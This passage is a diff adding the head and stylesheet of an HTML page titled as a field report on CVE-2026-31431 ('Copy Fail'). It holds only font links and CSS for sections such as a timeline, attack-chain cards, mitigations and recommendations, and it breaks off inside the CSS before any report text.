@@ -1,0 +1,2750 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Copy Fail · CVE-2026-31431 · Field Report</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght,SOFT@0,9..144,300..900,0..100;1,9..144,300..900,0..100&family=Geist:wght@300..700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+:root[data-theme="dark"] {
+  --bg: #0B0E12;
+  --bg-elev: #11151B;
+  --bg-card: #161B23;
+  --border: #232A36;
+  --border-strong: #2F3845;
+  --text: #E8E6E1;
+  --text-dim: #9AA3B0;
+  --text-mute: #6A7280;
+  --danger: #FF4D3D;
+  --danger-soft: rgba(255, 77, 61, 0.12);
+  --constructive: #3BCEAC;
+  --constructive-soft: rgba(59, 206, 172, 0.12);
+  --inflection: #F2B233;
+  --inflection-soft: rgba(242, 178, 51, 0.12);
+  --shadow: 0 30px 80px -30px rgba(0, 0, 0, 0.6);
+  --grad-1: radial-gradient(1200px 700px at 80% -10%, rgba(255, 77, 61, 0.08), transparent 60%);
+  --grad-2: radial-gradient(900px 600px at -10% 40%, rgba(59, 206, 172, 0.06), transparent 60%);
+  --grad-3: radial-gradient(800px 500px at 100% 100%, rgba(242, 178, 51, 0.05), transparent 60%);
+}
+
+:root[data-theme="light"] {
+  --bg: #F4EFE6;
+  --bg-elev: #EAE3D5;
+  --bg-card: #FFFEFB;
+  --border: #D9D1BF;
+  --border-strong: #B8AE96;
+  --text: #1A1610;
+  --text-dim: #4A4438;
+  --text-mute: #786E58;
+  --danger: #C2331F;
+  --danger-soft: rgba(194, 51, 31, 0.10);
+  --constructive: #1E8B6E;
+  --constructive-soft: rgba(30, 139, 110, 0.10);
+  --inflection: #B8841A;
+  --inflection-soft: rgba(184, 132, 26, 0.10);
+  --shadow: 0 30px 80px -40px rgba(120, 110, 88, 0.35);
+  --grad-1: radial-gradient(1200px 700px at 80% -10%, rgba(194, 51, 31, 0.06), transparent 60%);
+  --grad-2: radial-gradient(900px 600px at -10% 40%, rgba(30, 139, 110, 0.05), transparent 60%);
+  --grad-3: radial-gradient(800px 500px at 100% 100%, rgba(184, 132, 26, 0.04), transparent 60%);
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Geist', -apple-system, sans-serif;
+  font-weight: 400;
+  font-size: 17px;
+  line-height: 1.6;
+  letter-spacing: -0.005em;
+  overflow-x: hidden;
+  transition: background 0.4s ease, color 0.4s ease;
+}
+
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: var(--grad-1), var(--grad-2), var(--grad-3);
+  pointer-events: none;
+  z-index: 0;
+  transition: opacity 0.4s ease;
+}
+
+main { position: relative; z-index: 1; }
+
+/* THEME TOGGLE */
+.theme-toggle {
+  position: fixed;
+  top: 24px;
+  right: 24px;
+  z-index: 100;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 999px;
+  padding: 8px 16px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  color: var(--text-dim);
+  cursor: pointer;
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  transition: all 0.25s ease;
+}
+.theme-toggle:hover {
+  color: var(--text);
+  border-color: var(--border-strong);
+  transform: translateY(-1px);
+}
+.theme-toggle svg { width: 14px; height: 14px; }
+
+/* TYPOGRAPHY */
+.display {
+  font-family: 'Fraunces', serif;
+  font-variation-settings: "opsz" 144, "SOFT" 30;
+  font-weight: 400;
+  letter-spacing: -0.03em;
+  line-height: 1;
+}
+.serif {
+  font-family: 'Fraunces', serif;
+  font-variation-settings: "opsz" 24, "SOFT" 20;
+}
+.mono {
+  font-family: 'JetBrains Mono', monospace;
+  letter-spacing: 0;
+}
+
+/* LAYOUT PRIMITIVES */
+.container {
+  max-width: 1180px;
+  margin: 0 auto;
+  padding: 0 32px;
+}
+.container-narrow {
+  max-width: 820px;
+  margin: 0 auto;
+  padding: 0 32px;
+}
+
+section {
+  padding: 120px 0;
+  position: relative;
+}
+
+@media (max-width: 768px) {
+  section { padding: 80px 0; }
+  .container, .container-narrow { padding: 0 20px; }
+}
+
+/* WHAT CHANGED — frame grid */
+.frame-grid {
+  display: grid;
+  gap: 0;
+  margin-bottom: 56px;
+  border-top: 1px solid var(--border);
+}
+.frame-card {
+  display: grid;
+  grid-template-columns: 1.4fr 1fr 32px 1.4fr;
+  gap: 24px;
+  align-items: center;
+  padding: 24px 0;
+  border-bottom: 1px solid var(--border);
+}
+@media (max-width: 768px) {
+  .frame-card {
+    grid-template-columns: 1fr;
+    gap: 6px;
+    padding: 20px 0;
+  }
+}
+.frame-label {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+}
+.frame-before {
+  font-family: 'Fraunces', serif;
+  font-style: italic;
+  font-size: clamp(20px, 2.4vw, 26px);
+  line-height: 1.2;
+  color: var(--text-dim);
+  font-weight: 350;
+}
+.frame-after {
+  font-family: 'Fraunces', serif;
+  font-size: clamp(20px, 2.4vw, 26px);
+  line-height: 1.2;
+  color: var(--text);
+  font-weight: 400;
+  font-variation-settings: "opsz" 32, "SOFT" 30;
+}
+.frame-mute {
+  font-family: 'Geist', sans-serif;
+  font-size: 14px;
+  font-style: normal;
+  color: var(--text-mute);
+  font-weight: 400;
+  letter-spacing: -0.005em;
+  display: block;
+  margin-top: 4px;
+}
+.frame-arrow {
+  font-family: 'Fraunces', serif;
+  font-size: 24px;
+  color: var(--inflection);
+  text-align: center;
+}
+@media (max-width: 768px) {
+  .frame-arrow { display: none; }
+  .frame-after { padding-left: 16px; border-left: 2px solid var(--inflection); margin-top: 4px; }
+}
+.frame-thesis {
+  font-family: 'Fraunces', serif;
+  font-style: italic;
+  font-size: clamp(18px, 2vw, 22px);
+  line-height: 1.5;
+  color: var(--text-dim);
+  font-weight: 350;
+  font-variation-settings: "opsz" 32, "SOFT" 30;
+  max-width: 64ch;
+}
+
+/* SECTION TITLE — keep tight */
+.eyebrow {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  font-weight: 500;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+  margin-bottom: 20px;
+}
+.eyebrow-num {
+  color: var(--danger);
+  margin-right: 16px;
+}
+
+h2.section-title {
+  font-family: 'Fraunces', serif;
+  font-variation-settings: "opsz" 96, "SOFT" 30;
+  font-weight: 350;
+  font-size: clamp(36px, 5vw, 60px);
+  line-height: 1.05;
+  letter-spacing: -0.025em;
+  margin-bottom: 28px;
+  max-width: 18ch;
+}
+.section-lede {
+  font-family: 'Fraunces', serif;
+  font-variation-settings: "opsz" 24, "SOFT" 30;
+  font-weight: 350;
+  font-style: italic;
+  font-size: clamp(18px, 2vw, 22px);
+  line-height: 1.5;
+  color: var(--text-dim);
+  max-width: 60ch;
+  margin-bottom: 64px;
+}
+
+/* HERO */
+.hero {
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  padding: 120px 0 80px;
+  position: relative;
+  overflow: hidden;
+}
+
+.hero-meta {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px 32px;
+  margin-bottom: 56px;
+  position: relative;
+  z-index: 2;
+}
+.hero-meta span { display: inline-flex; align-items: center; gap: 8px; }
+.hero-meta .dot {
+  width: 6px; height: 6px; border-radius: 50%;
+  background: var(--danger);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(255,77,61,0.4); }
+  50% { opacity: 0.7; box-shadow: 0 0 0 8px rgba(255,77,61,0); }
+}
+
+.hero-title {
+  font-family: 'Fraunces', serif;
+  font-variation-settings: "opsz" 144, "SOFT" 30;
+  font-weight: 350;
+  font-size: clamp(64px, 11vw, 168px);
+  line-height: 0.92;
+  letter-spacing: -0.045em;
+  margin-bottom: 32px;
+  position: relative;
+  z-index: 2;
+  padding-right: 0.5em;
+}
+.hero-title em {
+  font-style: italic;
+  font-weight: 300;
+  background: linear-gradient(110deg, var(--danger) 30%, var(--inflection) 80%);
+  -webkit-background-clip: text;
+  background-clip: text;
+  -webkit-text-fill-color: transparent;
+  color: transparent;
+}
+
+.hero-deck {
+  font-family: 'Fraunces', serif;
+  font-variation-settings: "opsz" 32, "SOFT" 30;
+  font-weight: 350;
+  font-style: italic;
+  font-size: clamp(20px, 2.5vw, 28px);
+  line-height: 1.4;
+  color: var(--text-dim);
+  max-width: 38ch;
+  margin-bottom: 80px;
+  position: relative;
+  z-index: 2;
+}
+
+.hero-svg-wrap {
+  position: absolute;
+  top: 50%;
+  right: -10%;
+  transform: translateY(-50%);
+  width: 60vw;
+  max-width: 720px;
+  height: 60vw;
+  max-height: 720px;
+  z-index: 1;
+  opacity: 0.85;
+  pointer-events: none;
+}
+
+@media (max-width: 1024px) {
+  .hero-svg-wrap { right: -25%; opacity: 0.5; }
+}
+@media (max-width: 640px) {
+  .hero-svg-wrap { display: none; }
+}
+
+.hero-scroll-prompt {
+  position: absolute;
+  bottom: 40px;
+  left: 50%;
+  transform: translateX(-50%);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 12px;
+  animation: scroll-pulse 2.5s ease-in-out infinite;
+}
+.hero-scroll-prompt::after {
+  content: '';
+  width: 1px;
+  height: 40px;
+  background: linear-gradient(to bottom, var(--text-mute), transparent);
+}
+
+@keyframes scroll-pulse {
+  0%, 100% { opacity: 0.5; transform: translateX(-50%) translateY(0); }
+  50% { opacity: 1; transform: translateX(-50%) translateY(6px); }
+}
+
+/* STAT GRID */
+.stat-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 1px;
+  background: var(--border);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  overflow: hidden;
+}
+@media (max-width: 768px) {
+  .stat-grid { grid-template-columns: 1fr; }
+}
+
+.stat-cell {
+  background: var(--bg-card);
+  padding: 40px 32px;
+  position: relative;
+  transition: background 0.3s ease;
+}
+.stat-cell:hover { background: var(--bg-elev); }
+.stat-cell::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 2px;
+  background: var(--danger);
+  transform: scaleX(0);
+  transform-origin: left;
+  transition: transform 0.6s cubic-bezier(0.2, 0.8, 0.2, 1);
+}
+.stat-cell.in-view::before { transform: scaleX(1); }
+.stat-cell:nth-child(2)::before { background: var(--inflection); }
+.stat-cell:nth-child(3)::before { background: var(--constructive); }
+.stat-cell:nth-child(4)::before { background: var(--constructive); }
+.stat-cell:nth-child(5)::before { background: var(--danger); }
+.stat-cell:nth-child(6)::before { background: var(--inflection); }
+
+.stat-num {
+  font-family: 'Fraunces', serif;
+  font-variation-settings: "opsz" 144, "SOFT" 0;
+  font-weight: 300;
+  font-size: clamp(56px, 7vw, 92px);
+  line-height: 1;
+  letter-spacing: -0.04em;
+  margin-bottom: 8px;
+  color: var(--text);
+}
+.stat-num .unit {
+  font-size: 0.45em;
+  color: var(--text-dim);
+  margin-left: 8px;
+  letter-spacing: -0.02em;
+}
+.stat-label {
+  font-family: 'Geist', sans-serif;
+  font-weight: 500;
+  font-size: 15px;
+  margin-bottom: 12px;
+  line-height: 1.3;
+}
+.stat-source {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+}
+
+/* PULLQUOTE */
+.pullquote {
+  padding: 100px 0;
+  position: relative;
+}
+.pullquote-inner {
+  max-width: 820px;
+  margin: 0 auto;
+  padding: 0 32px;
+  position: relative;
+}
+.pullquote-mark {
+  font-family: 'Fraunces', serif;
+  font-variation-settings: "opsz" 144, "SOFT" 100;
+  font-weight: 700;
+  font-style: italic;
+  font-size: 220px;
+  line-height: 0.5;
+  color: var(--danger);
+  opacity: 0.4;
+  margin-bottom: -40px;
+  display: block;
+}
+.pullquote-mark.constructive { color: var(--constructive); }
+.pullquote-mark.inflection { color: var(--inflection); }
+.pullquote-text {
+  font-family: 'Fraunces', serif;
+  font-variation-settings: "opsz" 96, "SOFT" 30;
+  font-weight: 350;
+  font-style: italic;
+  font-size: clamp(28px, 3.5vw, 44px);
+  line-height: 1.25;
+  letter-spacing: -0.015em;
+  margin-bottom: 32px;
+  color: var(--text);
+}
+.pullquote-attr {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+  border-top: 1px solid var(--border);
+  padding-top: 16px;
+}
+.pullquote-attr strong {
+  color: var(--text-dim);
+  font-weight: 500;
+}
+
+/* TIMELINE */
+.timeline {
+  position: relative;
+  padding-left: 0;
+}
+.timeline::before {
+  content: '';
+  position: absolute;
+  left: 50%;
+  top: 0; bottom: 0;
+  width: 1px;
+  background: linear-gradient(to bottom,
+    transparent 0%,
+    var(--border) 5%,
+    var(--border) 95%,
+    transparent 100%);
+  transform: translateX(-50%);
+}
+@media (max-width: 768px) {
+  .timeline::before { left: 20px; }
+}
+
+.tl-event {
+  position: relative;
+  margin-bottom: 56px;
+  display: grid;
+  grid-template-columns: 1fr auto 1fr;
+  gap: 0 48px;
+  align-items: start;
+}
+.tl-event:last-child { margin-bottom: 0; }
+
+@media (max-width: 768px) {
+  .tl-event {
+    grid-template-columns: 40px 1fr;
+    gap: 0;
+  }
+}
+
+.tl-spine-marker {
+  width: 14px; height: 14px;
+  border-radius: 50%;
+  background: var(--bg);
+  border: 2px solid var(--text-mute);
+  position: relative;
+  z-index: 2;
+  transition: all 0.4s ease;
+  margin-top: 8px;
+}
+.tl-event.confirmed .tl-spine-marker { border-color: var(--constructive); }
+.tl-event.inflection-event .tl-spine-marker {
+  border-color: var(--inflection);
+  background: var(--inflection);
+  box-shadow: 0 0 0 0 var(--inflection-soft);
+  animation: marker-pulse 2.5s ease-in-out infinite;
+}
+.tl-event.danger-event .tl-spine-marker {
+  border-color: var(--danger);
+  background: var(--danger);
+}
+
+@keyframes marker-pulse {
+  0%, 100% { box-shadow: 0 0 0 0 rgba(242, 178, 51, 0.4); }
+  50% { box-shadow: 0 0 0 12px rgba(242, 178, 51, 0); }
+}
+
+@media (max-width: 768px) {
+  .tl-spine-marker { margin-left: 13px; margin-top: 12px; }
+}
+
+.tl-content {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 24px 28px;
+  position: relative;
+  cursor: pointer;
+  transition: all 0.3s ease;
+}
+.tl-content:hover {
+  border-color: var(--border-strong);
+  transform: translateY(-2px);
+  box-shadow: var(--shadow);
+}
+.tl-content::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 1px;
+  background: var(--text-mute);
+  opacity: 0.3;
+}
+.tl-event.confirmed .tl-content::before { background: var(--constructive); opacity: 0.6; }
+.tl-event.inflection-event .tl-content::before { background: var(--inflection); opacity: 0.8; }
+.tl-event.danger-event .tl-content::before { background: var(--danger); opacity: 0.8; }
+
+@media (min-width: 769px) {
+  .tl-event.tl-left .tl-content { grid-column: 1; text-align: right; }
+  .tl-event.tl-left .tl-content::before { left: 0; right: 0; }
+  .tl-event.tl-left .tl-meta { justify-content: flex-end; }
+  .tl-event.tl-right .tl-content { grid-column: 3; }
+}
+@media (max-width: 768px) {
+  .tl-content { grid-column: 2; margin-left: 16px; }
+}
+
+.tl-meta {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+  display: flex;
+  gap: 16px;
+  margin-bottom: 8px;
+}
+.tl-date { color: var(--text-dim); font-weight: 500; }
+.tl-phase {
+  background: var(--bg-elev);
+  padding: 2px 8px;
+  border-radius: 2px;
+  font-size: 10px;
+}
+.tl-title {
+  font-family: 'Fraunces', serif;
+  font-variation-settings: "opsz" 24, "SOFT" 30;
+  font-weight: 400;
+  font-size: 19px;
+  line-height: 1.3;
+  margin-bottom: 8px;
+}
+.tl-summary { font-size: 14px; line-height: 1.55; color: var(--text-dim); margin-bottom: 12px; }
+.tl-detail {
+  display: none;
+  padding-top: 12px;
+  border-top: 1px solid var(--border);
+  font-size: 14px;
+  line-height: 1.6;
+  color: var(--text-dim);
+  margin-top: 12px;
+}
+.tl-content[aria-expanded="true"] .tl-detail { display: block; }
+.tl-detail .cite {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  color: var(--text-mute);
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  margin-top: 12px;
+  display: block;
+}
+.tl-expand {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  margin-top: 8px;
+}
+.tl-expand::after {
+  content: '+';
+  font-size: 14px;
+  transition: transform 0.3s ease;
+}
+.tl-content[aria-expanded="true"] .tl-expand::after {
+  content: '−';
+  transform: rotate(180deg);
+}
+
+/* PHASE LABELS */
+.phase-label {
+  display: grid;
+  grid-template-columns: 1fr auto 1fr;
+  gap: 0 48px;
+  margin: 64px 0 32px;
+  align-items: center;
+}
+@media (max-width: 768px) {
+  .phase-label { grid-template-columns: 40px 1fr; margin-left: 16px; }
+}
+.phase-label-spine { display: flex; justify-content: center; }
+.phase-label-spine svg { width: 24px; height: 24px; color: var(--text-mute); }
+.phase-label-text {
+  grid-column: 3;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  color: var(--danger);
+  font-weight: 500;
+}
+@media (max-width: 768px) {
+  .phase-label-text { grid-column: 2; padding-left: 16px; }
+}
+
+/* PATCH WINDOW CHART */
+.patch-chart-wrap {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 48px 32px 32px;
+  margin-top: 32px;
+}
+.patch-chart-svg { width: 100%; height: auto; }
+.chart-callout-title {
+  font-family: 'Fraunces', serif;
+  font-style: italic;
+  font-size: 13px;
+  fill: var(--text);
+  font-weight: 400;
+}
+.chart-callout-body {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  fill: var(--text-mute);
+  letter-spacing: 0.05em;
+}
+
+/* ATTACK CHAIN */
+.attack-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+  gap: 24px;
+}
+.attack-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 28px;
+  cursor: pointer;
+  position: relative;
+  transition: all 0.3s ease;
+  overflow: hidden;
+}
+.attack-card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 2px;
+  background: var(--danger);
+  transform: scaleX(0);
+  transform-origin: left;
+  transition: transform 0.5s cubic-bezier(0.2, 0.8, 0.2, 1);
+}
+.attack-card:hover::before { transform: scaleX(1); }
+.attack-card:hover {
+  border-color: var(--border-strong);
+  transform: translateY(-2px);
+  box-shadow: var(--shadow);
+}
+.attack-tac {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  color: var(--danger);
+  margin-bottom: 8px;
+}
+.attack-id {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--text-mute);
+  letter-spacing: 0.05em;
+  margin-bottom: 6px;
+}
+.attack-name {
+  font-family: 'Fraunces', serif;
+  font-variation-settings: "opsz" 32, "SOFT" 30;
+  font-weight: 400;
+  font-size: 22px;
+  line-height: 1.2;
+  margin-bottom: 16px;
+}
+.attack-summary { font-size: 14px; line-height: 1.55; color: var(--text-dim); margin-bottom: 16px; }
+.attack-detail {
+  display: none;
+  padding-top: 16px;
+  border-top: 1px solid var(--border);
+  font-size: 14px;
+  line-height: 1.6;
+  color: var(--text-dim);
+}
+.attack-card[aria-expanded="true"] .attack-detail { display: block; }
+.attack-card[aria-expanded="true"] { background: var(--bg-elev); }
+.attack-detail strong { color: var(--text); font-weight: 500; }
+.attack-meta {
+  display: flex;
+  gap: 16px;
+  margin-top: 12px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+}
+.attack-conf {
+  padding: 2px 8px;
+  border: 1px solid var(--border-strong);
+  border-radius: 2px;
+}
+.attack-conf.high { color: var(--constructive); border-color: var(--constructive); }
+.attack-conf.medium { color: var(--inflection); border-color: var(--inflection); }
+.attack-conf.low { color: var(--text-mute); }
+.attack-card .expand-hint {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+  display: inline-flex;
+  gap: 6px;
+}
+.attack-card .expand-hint::after { content: '+'; }
+.attack-card[aria-expanded="true"] .expand-hint::after { content: '−'; }
+
+/* SUPPORTING DROPDOWN */
+.supporting-wrap {
+  margin-top: 56px;
+  border-top: 1px solid var(--border);
+  padding-top: 32px;
+}
+.supporting-toggle {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  background: transparent;
+  border: 0;
+  width: 100%;
+  cursor: pointer;
+  padding: 16px 0;
+  text-align: left;
+  color: inherit;
+  font-family: inherit;
+}
+.supporting-label {
+  font-family: 'Fraunces', serif;
+  font-variation-settings: "opsz" 32, "SOFT" 30;
+  font-weight: 400;
+  font-size: 22px;
+  font-style: italic;
+}
+.supporting-meta {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+}
+.supporting-toggle::after {
+  content: '+';
+  font-size: 24px;
+  color: var(--text-mute);
+  margin-left: 16px;
+  transition: transform 0.3s ease;
+}
+.supporting-toggle[aria-expanded="true"]::after {
+  content: '−';
+  transform: rotate(180deg);
+}
+.supporting-list {
+  display: none;
+  margin-top: 24px;
+  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+  gap: 24px;
+}
+
+/* STANDARDS MAPPING */
+.standards-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 20px;
+}
+@media (max-width: 768px) { .standards-grid { grid-template-columns: 1fr; } }
+
+.standards-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--inflection);
+  padding: 24px 28px;
+  border-radius: 0 4px 4px 0;
+}
+.standards-card.primary { border-left-color: var(--danger); }
+.standards-card.contributing { border-left-color: var(--inflection); }
+.standards-card.peripheral { border-left-color: var(--text-mute); }
+.standards-id {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 0.08em;
+  color: var(--text-dim);
+  margin-bottom: 6px;
+}
+.standards-name {
+  font-family: 'Fraunces', serif;
+  font-weight: 400;
+  font-size: 19px;
+  margin-bottom: 12px;
+}
+.standards-body { font-size: 14px; line-height: 1.55; color: var(--text-dim); margin-bottom: 12px; }
+.standards-severity {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  display: inline-block;
+  padding: 3px 10px;
+  border-radius: 2px;
+  background: var(--danger-soft);
+  color: var(--danger);
+}
+.standards-severity.contributing { background: var(--inflection-soft); color: var(--inflection); }
+.standards-severity.peripheral { background: var(--bg-elev); color: var(--text-mute); }
+
+.standards-honesty {
+  background: var(--bg-elev);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 28px;
+  margin-bottom: 32px;
+  font-family: 'Fraunces', serif;
+  font-style: italic;
+  font-size: 17px;
+  line-height: 1.55;
+  color: var(--text-dim);
+}
+.standards-honesty strong { color: var(--text); font-style: normal; font-family: 'Geist'; font-weight: 500; }
+
+/* MITIGATIONS — what existed */
+.mitigation-list {
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+}
+.mit-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 24px 28px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  position: relative;
+}
+.mit-card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 2px;
+  background: var(--constructive);
+  transform: scaleX(0);
+  transform-origin: left;
+  transition: transform 0.5s ease;
+}
+.mit-card:hover::before { transform: scaleX(1); }
+.mit-card:hover { border-color: var(--border-strong); }
+
+.mit-header {
+  display: grid;
+  grid-template-columns: auto 1fr auto;
+  gap: 24px;
+  align-items: baseline;
+}
+@media (max-width: 640px) {
+  .mit-header { grid-template-columns: auto 1fr; }
+  .mit-header .mit-expand { grid-column: 2; justify-self: end; margin-top: 8px; }
+}
+
+.mit-num {
+  font-family: 'Fraunces', serif;
+  font-weight: 300;
+  font-size: 38px;
+  line-height: 1;
+  color: var(--constructive);
+  font-style: italic;
+  font-variation-settings: "opsz" 96;
+}
+.mit-title {
+  font-family: 'Fraunces', serif;
+  font-weight: 400;
+  font-size: 22px;
+  line-height: 1.25;
+}
+.mit-expand {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+}
+.mit-expand::after { content: ' +'; }
+.mit-card[aria-expanded="true"] .mit-expand::after { content: ' −'; }
+.mit-detail {
+  display: none;
+  margin-top: 20px;
+  padding-top: 20px;
+  border-top: 1px solid var(--border);
+}
+.mit-card[aria-expanded="true"] .mit-detail { display: block; }
+.mit-detail h4 {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+  margin-bottom: 6px;
+  margin-top: 16px;
+  font-weight: 500;
+}
+.mit-detail h4:first-child { margin-top: 0; }
+.mit-detail p { font-size: 14.5px; line-height: 1.6; color: var(--text-dim); }
+.mit-detail p strong { color: var(--text); font-weight: 500; }
+.mit-frame {
+  background: var(--constructive-soft);
+  border-left: 2px solid var(--constructive);
+  padding: 14px 18px;
+  margin-top: 16px;
+  font-family: 'Fraunces', serif;
+  font-style: italic;
+  font-size: 15px;
+  line-height: 1.55;
+  color: var(--text);
+}
+
+/* RECOMMENDATIONS */
+.tier-section { margin-bottom: 64px; }
+.tier-header {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  margin-bottom: 32px;
+  flex-wrap: wrap;
+}
+.tier-badge {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  font-weight: 500;
+  padding: 6px 14px;
+  border-radius: 2px;
+}
+.tier-badge.t1 { background: var(--danger-soft); color: var(--danger); border: 1px solid var(--danger); }
+.tier-badge.t2 { background: var(--inflection-soft); color: var(--inflection); border: 1px solid var(--inflection); }
+.tier-badge.t3 { background: var(--constructive-soft); color: var(--constructive); border: 1px solid var(--constructive); }
+.tier-title {
+  font-family: 'Fraunces', serif;
+  font-weight: 400;
+  font-size: 26px;
+  line-height: 1.2;
+}
+.tier-meta { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-mute); letter-spacing: 0.08em; }
+
+.rec-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 20px;
+}
+@media (max-width: 768px) { .rec-grid { grid-template-columns: 1fr; } }
+
+.rec-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 24px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+}
+.rec-card:hover {
+  border-color: var(--border-strong);
+  transform: translateY(-2px);
+}
+.rec-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.15em;
+  color: var(--text-mute);
+  margin-bottom: 8px;
+}
+.rec-title {
+  font-family: 'Fraunces', serif;
+  font-weight: 400;
+  font-size: 18px;
+  line-height: 1.3;
+  margin-bottom: 14px;
+}
+.rec-detail { display: none; margin-top: 16px; padding-top: 16px; border-top: 1px solid var(--border); }
+.rec-card[aria-expanded="true"] .rec-detail { display: block; }
+.rec-detail dt {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+  margin-top: 12px;
+  margin-bottom: 4px;
+}
+.rec-detail dt:first-child { margin-top: 0; }
+.rec-detail dd {
+  font-size: 14px;
+  line-height: 1.55;
+  color: var(--text-dim);
+}
+.rec-detail dd.effort {
+  font-family: 'Fraunces', serif;
+  font-style: italic;
+  font-size: 14.5px;
+  margin-top: 4px;
+}
+.rec-expand-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+}
+.rec-expand-row::after { content: '+'; font-size: 14px; }
+.rec-card[aria-expanded="true"] .rec-expand-row::after { content: '−'; }
+
+/* FINAL CALLOUT */
+.final-callout {
+  background: var(--bg-card);
